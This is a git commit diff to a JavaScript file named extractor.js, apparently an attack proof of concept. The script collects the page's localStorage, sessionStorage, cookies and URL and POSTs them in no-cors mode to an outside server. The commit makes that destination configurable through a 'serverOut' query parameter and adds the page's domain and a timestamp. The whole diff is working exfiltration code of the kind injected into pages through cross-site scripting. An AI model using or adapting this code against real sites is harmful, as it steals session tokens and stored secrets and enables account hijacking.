d232f2517209995535a62d11d73c26950eb29f07
g6g <gaetan.guibaud@gmail.com>
2026-07-22 13:03:32 +0200

    extractor.js

--- extractor.js
+++ extractor.js
@@ -3,10 +3,14 @@
         localStorage: {...localStorage},
         sessionStorage: {...sessionStorage},
         cookies: document.cookie,
-        url: location.href
+        url: location.href,
+        timestamp: new Date().toISOString()
     };
 
-    fetch('https://o.g6g.fr', {
+    // Récupère serverOut depuis les query params de la page hébergeant le PoC
+    const serverOut = new URLSearchParams(location.search)?.get('serverOut')?? "https://o.g6g.fr";
+
+    fetch(serverOut+'/'+document.domain, {
         method: 'POST',
         mode: 'no-cors',
         body: JSON.stringify(dump)
